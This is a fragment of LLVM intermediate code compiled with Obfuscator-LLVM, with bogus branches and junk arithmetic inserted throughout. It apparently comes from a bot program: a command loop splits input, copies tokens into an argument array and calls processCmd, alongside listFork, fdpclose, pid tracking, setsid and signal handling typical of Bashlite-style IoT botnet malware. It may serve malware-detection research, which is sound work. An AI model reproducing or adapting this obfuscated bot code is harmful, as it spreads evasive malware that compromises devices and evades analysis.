  %654 = call noalias i8* @malloc(i64 %653) #4
  %655 = load i32, i32* %21, align 4
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %656
  store i8* %654, i8** %657, align 8
  %658 = load i32, i32* %21, align 4
  %659 = sext i32 %658 to i64
  %660 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %659
  %661 = load i8*, i8** %660, align 8
  %662 = load i8*, i8** %22, align 8
  %663 = call i64 @strlen(i8* %662) #10
  %664 = add i64 %663, 1
  call void @llvm.memset.p0i8.i64(i8* %661, i8 0, i64 %664, i32 1, i1 false)
  %665 = load i32, i32* %21, align 4
  %666 = sext i32 %665 to i64
  %667 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %666
  %668 = load i8*, i8** %667, align 8
  %669 = load i8*, i8** %22, align 8
  %670 = call i8* @strcpy(i8* %668, i8* %669) #4
  %671 = load i32, i32* %21, align 4
  %672 = add nsw i32 %671, 1
  store i32 %672, i32* %21, align 4
  %673 = load i32, i32* @x.87
  %674 = load i32, i32* @y.88
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBBpart2131, label %originalBB100alteredBB

originalBBpart2131:                               ; preds = %originalBB100
  br label %681

; <label>:681:                                    ; preds = %originalBBpart2131, %originalBBpart298
  %682 = load i32, i32* @x.87
  %683 = load i32, i32* @y.88
  %684 = sub i32 %682, 1
  %685 = mul i32 %682, %684
  %686 = urem i32 %685, 2
  %687 = icmp eq i32 %686, 0
  %688 = icmp slt i32 %683, 10
  %689 = or i1 %687, %688
  br i1 %689, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %681
  %690 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0)) #4
  store i8* %690, i8** %22, align 8
  %691 = load i32, i32* @x.87
  %692 = load i32, i32* @y.88
  %693 = sub i32 %691, 1
  %694 = mul i32 %691, %693
  %695 = urem i32 %694, 2
  %696 = icmp eq i32 %695, 0
  %697 = icmp slt i32 %692, 10
  %698 = or i1 %696, %697
  br i1 %698, label %originalBBpart2135, label %originalBB133alteredBB

originalBBpart2135:                               ; preds = %originalBB133
  br label %602

; <label>:699:                                    ; preds = %originalBBpart294
  %700 = load i32, i32* @x.87
  %701 = load i32, i32* @y.88
  %702 = sub i32 %700, 1
  %703 = mul i32 %700, %702
  %704 = urem i32 %703, 2
  %705 = icmp eq i32 %704, 0
  %706 = icmp slt i32 %701, 10
  %707 = or i1 %705, %706
  br i1 %707, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %699
  %708 = load i32, i32* %21, align 4
  %709 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i32 0, i32 0
  call void @processCmd(i32 %708, i8** %709)
  %710 = load i32, i32* %21, align 4
  %711 = icmp sgt i32 %710, 1
  %712 = load i32, i32* @x.87
  %713 = load i32, i32* @y.88
  %714 = sub i32 %712, 1
  %715 = mul i32 %712, %714
  %716 = urem i32 %715, 2
  %717 = icmp eq i32 %716, 0
  %718 = icmp slt i32 %713, 10
  %719 = or i1 %717, %718
  br i1 %719, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br i1 %711, label %720, label %750

; <label>:720:                                    ; preds = %originalBBpart2139
  store i32 1, i32* %23, align 4
  store i32 1, i32* %23, align 4
  br label %721

; <label>:721:                                    ; preds = %originalBBpart2153, %720
  %722 = load i32, i32* %23, align 4
  %723 = load i32, i32* %21, align 4
  %724 = icmp slt i32 %722, %723
  br i1 %724, label %725, label %749

; <label>:725:                                    ; preds = %721
  %726 = load i32, i32* %23, align 4
  %727 = sext i32 %726 to i64
  %728 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %727
  %729 = load i8*, i8** %728, align 8
  call void @free(i8* %729) #4
  br label %730

; <label>:730:                                    ; preds = %725
  %731 = load i32, i32* @x.87
  %732 = load i32, i32* @y.88
  %733 = sub i32 %731, 1
  %734 = mul i32 %731, %733
  %735 = urem i32 %734, 2
  %736 = icmp eq i32 %735, 0
  %737 = icmp slt i32 %732, 10
  %738 = or i1 %736, %737
  br i1 %738, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %730
  %739 = load i32, i32* %23, align 4
  %740 = add nsw i32 %739, 1
  store i32 %740, i32* %23, align 4
  %741 = load i32, i32* @x.87
  %742 = load i32, i32* @y.88
  %743 = sub i32 %741, 1
  %744 = mul i32 %741, %743
  %745 = urem i32 %744, 2
  %746 = icmp eq i32 %745, 0
  %747 = icmp slt i32 %742, 10
  %748 = or i1 %746, %747
  br i1 %748, label %originalBBpart2153, label %originalBB141alteredBB

originalBBpart2153:                               ; preds = %originalBB141
  br label %721

; <label>:749:                                    ; preds = %721
  br label %750

; <label>:750:                                    ; preds = %749, %originalBBpart2139
  br label %751

; <label>:751:                                    ; preds = %750, %originalBBpart244
  br label %129

; <label>:752:                                    ; preds = %129
  %753 = load i32, i32* @x.87
  %754 = load i32, i32* @y.88
  %755 = sub i32 %753, 1
  %756 = mul i32 %753, %755
  %757 = urem i32 %756, 2
  %758 = icmp eq i32 %757, 0
  %759 = icmp slt i32 %754, 10
  %760 = or i1 %758, %759
  br i1 %760, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %752
  %761 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.87, i32 0, i32 0))
  %762 = load i32, i32* @x.87
  %763 = load i32, i32* @y.88
  %764 = sub i32 %762, 1
  %765 = mul i32 %762, %764
  %766 = urem i32 %765, 2
  %767 = icmp eq i32 %766, 0
  %768 = icmp slt i32 %763, 10
  %769 = or i1 %767, %768
  br i1 %769, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br label %119
                                                  ; No predecessors!
  %771 = load i32, i32* %3, align 4
  ret i32 %771

originalBBalteredBB:                              ; preds = %originalBB, %46
  %772 = load i32, i32* %6, align 4
  %773 = call i32 @waitpid(i32 %772, i32* %8, i32 0)
  call void @exit(i32 0) #14
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %65
  %774 = load i32, i32* %6, align 4
  %775 = icmp ne i32 %774, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %151
  %776 = load i32, i32* %13, align 4
  %777 = zext i32 %776 to i64
  %778 = load i64, i64* @numpids, align 8
  %779 = icmp ult i64 %777, %778
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %183
  %780 = load i32, i32* %13, align 4
  %_ = sub i32 0, %780
  %gen = add i32 %_, 1
  %_15 = shl i32 %780, 1
  %_16 = sub i32 0, %780
  %gen17 = add i32 %_16, 1
  %_18 = shl i32 %780, 1
  %_19 = sub i32 %780, 1
  %gen20 = mul i32 %_19, 1
  %_21 = shl i32 %780, 1
  %_22 = shl i32 %780, 1
  %_23 = sub i32 0, %780
  %gen24 = add i32 %_23, 1
  %781 = add i32 %780, 1
  store i32 %781, i32* %13, align 4
  br label %originalBB14

originalBB29alteredBB:                            ; preds = %originalBB29, %220
  %782 = load i32*, i32** @pids, align 8
  %783 = load i32, i32* %13, align 4
  %784 = zext i32 %783 to i64
  %785 = getelementptr inbounds i32, i32* %782, i64 %784
  %786 = load i32, i32* %785, align 4
  %787 = load i32*, i32** %12, align 8
  %788 = load i32, i32* %13, align 4
  %789 = zext i32 %788 to i64
  %790 = getelementptr inbounds i32, i32* %787, i64 %789
  store i32 %786, i32* %790, align 4
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %246
  %791 = load i32, i32* %13, align 4
  %_34 = shl i32 %791, 1
  %_35 = shl i32 %791, 1
  %_36 = shl i32 %791, 1
  %_37 = shl i32 %791, 1
  %_38 = shl i32 %791, 1
  %792 = add i32 %791, 1
  store i32 %792, i32* %13, align 4
  br label %originalBB33

originalBB42alteredBB:                            ; preds = %originalBB42, %291
  %793 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i32 0, i32 0
  store i8* %793, i8** %14, align 8
  %794 = load i8*, i8** %14, align 8
  %795 = load i8, i8* %794, align 1
  %796 = zext i8 %795 to i32
  %797 = icmp eq i32 %796, 33
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %316
  %798 = load i8*, i8** %15, align 8
  %799 = load i8, i8* %798, align 1
  %800 = zext i8 %799 to i32
  %801 = icmp ne i32 %800, 32
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %352
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %396
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %414
  %802 = load i8*, i8** %14, align 8
  %803 = load i8*, i8** %14, align 8
  %804 = call i64 @strlen(i8* %803) #10
  %_59 = sub i64 0, %804
  %gen60 = add i64 %_59, 1
  %_61 = shl i64 %804, 1
  %_62 = sub i64 %804, 1
  %gen63 = mul i64 %_62, 1
  %_64 = shl i64 %804, 1
  %805 = sub i64 %804, 1
  %806 = getelementptr inbounds i8, i8* %802, i64 %805
  store i8 0, i8* %806, align 1
  br label %originalBB58

originalBB68alteredBB:                            ; preds = %originalBB68, %438
  %807 = load i8*, i8** %14, align 8
  %808 = load i8, i8* %807, align 1
  %809 = zext i8 %808 to i32
  %810 = icmp ne i32 %809, 32
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %466
  %811 = load i8*, i8** %14, align 8
  %812 = getelementptr inbounds i8, i8* %811, i32 1
  store i8* %812, i8** %14, align 8
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %485
  %813 = load i8*, i8** %14, align 8
  store i8 0, i8* %813, align 1
  %814 = load i8*, i8** %14, align 8
  %815 = getelementptr inbounds i8, i8* %814, i32 1
  store i8* %815, i8** %14, align 8
  %816 = load i8*, i8** %16, align 8
  store i8* %816, i8** %17, align 8
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %523
  %817 = call i32 @listFork()
  %818 = icmp ne i32 %817, 0
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %550
  %819 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i32 0, i32 0
  %820 = load i32, i32* %19, align 4
  %821 = call i8* @fdgets(i8* %819, i32 1024, i32 %820)
  %822 = icmp ne i8* %821, null
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %578
  %823 = load i32, i32* %19, align 4
  %824 = call i32 @fdpclose(i32 %823)
  call void @exit(i32 0) #14
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %602
  %825 = load i8*, i8** %22, align 8
  %826 = icmp ne i8* %825, null
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %621
  %827 = load i8*, i8** %22, align 8
  %828 = load i8, i8* %827, align 1
  %829 = zext i8 %828 to i32
  %830 = icmp ne i32 %829, 10
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %642
  %831 = load i8*, i8** %22, align 8
  %832 = call i64 @strlen(i8* %831) #10
  %_101 = sub i64 %832, 1
  %gen102 = mul i64 %_101, 1
  %_103 = sub i64 %832, 1
  %gen104 = mul i64 %_103, 1
  %_105 = shl i64 %832, 1
  %_106 = sub i64 0, %832
  %gen107 = add i64 %_106, 1
  %_108 = sub i64 0, %832
  %gen109 = add i64 %_108, 1
  %_110 = shl i64 %832, 1
  %833 = add i64 %832, 1
  %834 = call noalias i8* @malloc(i64 %833) #4
  %835 = load i32, i32* %21, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %836
  store i8* %834, i8** %837, align 8
  %838 = load i32, i32* %21, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %839
  %841 = load i8*, i8** %840, align 8
  %842 = load i8*, i8** %22, align 8
  %843 = call i64 @strlen(i8* %842) #10
  %_111 = sub i64 %843, 1
  %gen112 = mul i64 %_111, 1
  %_113 = sub i64 %843, 1
  %gen114 = mul i64 %_113, 1
  %_115 = sub i64 %843, 1
  %gen116 = mul i64 %_115, 1
  %844 = add i64 %843, 1
  call void @llvm.memset.p0i8.i64(i8* %841, i8 0, i64 %844, i32 1, i1 false)
  %845 = load i32, i32* %21, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %846
  %848 = load i8*, i8** %847, align 8
  %849 = load i8*, i8** %22, align 8
  %850 = call i8* @strcpy(i8* %848, i8* %849) #4
  %851 = load i32, i32* %21, align 4
  %_117 = sub i32 0, %851
  %gen118 = add i32 %_117, 1
  %_119 = sub i32 %851, 1
  %gen120 = mul i32 %_119, 1
  %_121 = sub i32 %851, 1
  %gen122 = mul i32 %_121, 1
  %_123 = sub i32 0, %851
  %gen124 = add i32 %_123, 1
  %_125 = sub i32 %851, 1
  %gen126 = mul i32 %_125, 1
  %_127 = shl i32 %851, 1
  %_128 = sub i32 0, %851
  %gen129 = add i32 %_128, 1
  %852 = add nsw i32 %851, 1
  store i32 %852, i32* %21, align 4
  br label %originalBB100

originalBB133alteredBB:                           ; preds = %originalBB133, %681
  %853 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i32 0, i32 0)) #4
  store i8* %853, i8** %22, align 8
  br label %originalBB133

originalBB137alteredBB:                           ; preds = %originalBB137, %699
  %854 = load i32, i32* %21, align 4
  %855 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i32 0, i32 0
  call void @processCmd(i32 %854, i8** %855)
  %856 = load i32, i32* %21, align 4
  %857 = icmp sgt i32 %856, 1
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %730
  %858 = load i32, i32* %23, align 4
  %_142 = sub i32 %858, 1
  %gen143 = mul i32 %_142, 1
  %_144 = shl i32 %858, 1
  %_145 = shl i32 %858, 1
  %_146 = sub i32 %858, 1
  %gen147 = mul i32 %_146, 1
  %_148 = sub i32 0, %858
  %gen149 = add i32 %_148, 1
  %_150 = sub i32 0, %858
  %gen151 = add i32 %_150, 1
  %859 = add nsw i32 %858, 1
  store i32 %859, i32* %23, align 4
  br label %originalBB141

originalBB155alteredBB:                           ; preds = %originalBB155, %752
  %860 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.87, i32 0, i32 0))
  br label %originalBB155
}

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @printf(i8*, ...) #5

declare i32 @sleep(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind }
attributes #5 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146633309}
!2 = !{i32 -2146632618}
!3 = !{i32 -2146631869}
!4 = !{i32 -2146631046}
!5 = !{i32 -2146630236}
!6 = !{i32 -2146628811}
!7 = !{i32 -2146627949}
!8 = !{i32 -2146627228}
